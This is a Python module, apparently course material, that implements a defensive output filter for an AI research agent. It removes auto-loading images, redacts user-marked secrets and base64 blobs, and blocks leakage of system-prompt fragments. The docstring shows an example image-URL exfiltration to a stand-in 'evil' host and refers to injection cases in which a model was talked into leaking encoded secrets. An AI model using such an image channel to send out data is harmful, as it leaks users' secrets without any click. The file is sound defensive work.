"""
W07D3 L3 — output guard: deterministic rules applied to the writer's FINAL report.

L1 (guard.py) constrains CONTROL FLOW (who runs next). This layer constrains CONTENT at
the point of harm: whatever the model was talked into, these rules decide what actually
leaves the system. Pure functions, no network, no LangChain -> unit-testable offline.

Four rules (the LLM-judge backstop is a separate, later step):

  1. strip_images        Remove ALL markdown/HTML images. Images auto-load, so a URL like
                         ![x](https://evil/log?d=<secret>) leaks with ZERO user clicks
                         (the classic exfil channel). A text research report needs no images,
                         so this is default-deny, not an allowlist.
  2. redact_sensitive    Redact values the user marked sensitive in the QUESTION
                         (password / secret / token / api key / email ... in the same
                         sentence) from the report, incl. url-encoded and base64 forms.
  3. redact_b64_blobs    Redact base64-looking blobs that decode to printable text. Catches
                         a secret the model encoded itself — models often encode WRONG, so
                         exact-match on the planted encoding misses it (seen: exfil case 4).

  4. redact_prompt_fragments
                         Redact any run of >= 6 consecutive words that appears verbatim in one
                         of the agent's internal prompts (system-prompt leakage, OWASP LLM07).
                         Verbatim-run matching, not semantic: a paraphrase of the prompt passes.

Known limits (be honest in the write-up):
  - Rule 2 is a heuristic registry built from the user's own message. A production system
    should register secrets from an authoritative source (vault/env/fields marked
    sensitive), plus a known-format scanner (sk-..., AKIA..., JWT). Not done here.
  - Echoing the user's own secret back to the same user is not a cross-principal leak; the
    off-channel cases (image URL, encoded blob) are what this layer is gated on.
  - Plain external links are kept (citations are legitimate); only images auto-load.
"""

from __future__ import annotations

import base64
import binascii
import re
import urllib.parse
from dataclasses import dataclass, field

REDACTED = "[REDACTED]"
IMAGE_REMOVED = "[external image removed]"


@dataclass
class GuardResult:
    text: str
    events: list = field(default_factory=list)  # human-readable findings; empty = untouched


# ---------------------------------------------------------------------------
# Rule 1 — images
# ---------------------------------------------------------------------------

_MD_IMAGE = re.compile(r"!\[[^\]]*\]\([^)]*\)")        # ![alt](url)
_MD_IMAGE_REF = re.compile(r"!\[[^\]]*\]\[[^\]]*\]")    # ![alt][ref]
_HTML_IMG = re.compile(r"<img\b[^>]*>", re.IGNORECASE)  # <img src=...>


def strip_images(text: str) -> tuple[str, list]:
    events = []
    for name, rx in (("markdown image", _MD_IMAGE), ("markdown image ref", _MD_IMAGE_REF), ("html img", _HTML_IMG)):
        text, n = rx.subn(IMAGE_REMOVED, text)
        if n:
            events.append(f"removed {n} {name}(s)")
    return text, events


# ---------------------------------------------------------------------------
# Rule 2 — values the user marked sensitive
# ---------------------------------------------------------------------------

_CUES = re.compile(
    r"password|passwd|secret|token|api[ _-]?key|credential|confidential|private[ _-]key|e-?mail",
    re.IGNORECASE,
)
_TOKEN = re.compile(r"[A-Za-z0-9][A-Za-z0-9_\-.@+/]{7,}")
_SEGMENTS = re.compile(r"(?<=[.!?])\s+|\n+")


def extract_sensitive_values(question: str) -> list:
    """Secret-looking tokens (>=8 chars, letters AND digits) in any sentence that carries a
    sensitivity cue word. Deliberately narrow: false positives redact legit content."""
    values = set()
    for seg in _SEGMENTS.split(question or ""):
        if not _CUES.search(seg):
            continue
        for tok in _TOKEN.findall(seg):
            tok = tok.rstrip(".-_/+@")
            if len(tok) >= 8 and re.search(r"[A-Za-z]", tok) and re.search(r"\d", tok):
                values.add(tok)
    return sorted(values, key=len, reverse=True)


def _variants(value: str) -> list:
    raw = value.encode()
    out = {value, urllib.parse.quote(value, safe=""), urllib.parse.quote_plus(value)}
    for enc in (base64.b64encode, base64.urlsafe_b64encode):
        b = enc(raw).decode()
        out.update({b, b.rstrip("=")})
    return sorted(out, key=len, reverse=True)


def redact_sensitive(text: str, values: list) -> tuple[str, list]:
    events = []
    for v in values:
        hits = 0
        for variant in _variants(v):
            text, n = re.subn(re.escape(variant), REDACTED, text, flags=re.IGNORECASE)
            hits += n
        if hits:
            events.append(f"redacted user-marked sensitive value ({hits}x, len={len(v)})")
    return text, events


# ---------------------------------------------------------------------------
# Rule 3 — base64 blobs that decode to text
# ---------------------------------------------------------------------------

_B64_TOKEN = re.compile(r"(?<![A-Za-z0-9+/=_-])[A-Za-z0-9+/_-]{16,}={0,2}(?![A-Za-z0-9+/=_-])")


def _is_b64_text(tok: str) -> bool:
    # Letters AND a digit: base64 of text virtually always has both; plain words/slugs
    # ("how-to-hash-passwords-properly") never qualify. The printable-decode check below
    # does the real filtering (hex digests, ids etc. decode to non-printable bytes).
    if not (re.search(r"[A-Za-z]", tok) and re.search(r"\d", tok)):
        return False
    s = tok.replace("-", "+").replace("_", "/")
    try:
        raw = base64.b64decode(s + "=" * (-len(s) % 4), validate=True)
    except (binascii.Error, ValueError):
        return False
    if len(raw) < 8:
        return False
    return sum(32 <= b < 127 for b in raw) / len(raw) >= 0.9


def redact_b64_blobs(text: str) -> tuple[str, list]:
    n = 0

    def _sub(m):
        nonlocal n
        if _is_b64_text(m.group(0)):
            n += 1
            return REDACTED
        return m.group(0)

    out = _B64_TOKEN.sub(_sub, text)
    return out, ([f"redacted {n} base64 blob(s) decoding to text"] if n else [])


# ---------------------------------------------------------------------------
# Rule 4 — verbatim fragments of internal prompts
# ---------------------------------------------------------------------------

PROMPT_REDACTED = "[REDACTED: internal instructions]"
_WORD = re.compile(r"[A-Za-z0-9']+")
SHINGLE = 6  # consecutive words; a natural report essentially never repeats 6 prompt words in a row


def _words(text: str) -> list:
    return [(m.group(0).lower(), m.start(), m.end()) for m in _WORD.finditer(text)]


def _prompt_shingles(prompts, n: int = SHINGLE) -> set:
    grams = set()
    for p in prompts:
        # drop markdown-heading lines: the report template ("## Key Findings") is public by design
        body = "\n".join(l for l in p.splitlines() if not l.lstrip().startswith("#"))
        w = [t[0] for t in _words(body)]
        grams.update(tuple(w[i:i + n]) for i in range(len(w) - n + 1))
    return grams


def redact_prompt_fragments(text: str, prompts) -> tuple[str, list]:
    if not prompts:
        return text, []
    grams = _prompt_shingles(prompts)
    toks = _words(text)
    covered = [False] * len(toks)
    for i in range(len(toks) - SHINGLE + 1):
        if tuple(t[0] for t in toks[i:i + SHINGLE]) in grams:
            for j in range(i, i + SHINGLE):
                covered[j] = True
    spans, i = [], 0
    while i < len(toks):
        if covered[i]:
            j = i
            while j + 1 < len(toks) and covered[j + 1]:
                j += 1
            spans.append((toks[i][1], toks[j][2]))
            i = j + 1
        else:
            i += 1
    for a, b in reversed(spans):
        text = text[:a] + PROMPT_REDACTED + text[b:]
    return text, ([f"redacted {len(spans)} verbatim fragment(s) of internal prompts"] if spans else [])


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------

def sanitize_output(text: str, question: str = "", protected_prompts=()) -> GuardResult:
    """Apply all rules to the final report. Order matters: sensitive values first (so a
    value inside an image URL is still counted), then images, then generic base64."""
    events: list = []
    values = extract_sensitive_values(question)
    text, ev = redact_sensitive(text, values)
    events += ev
    text, ev = strip_images(text)
    events += ev
    text, ev = redact_b64_blobs(text)
    events += ev
    text, ev = redact_prompt_fragments(text, protected_prompts)
    events += ev
    return GuardResult(text=text, events=events)
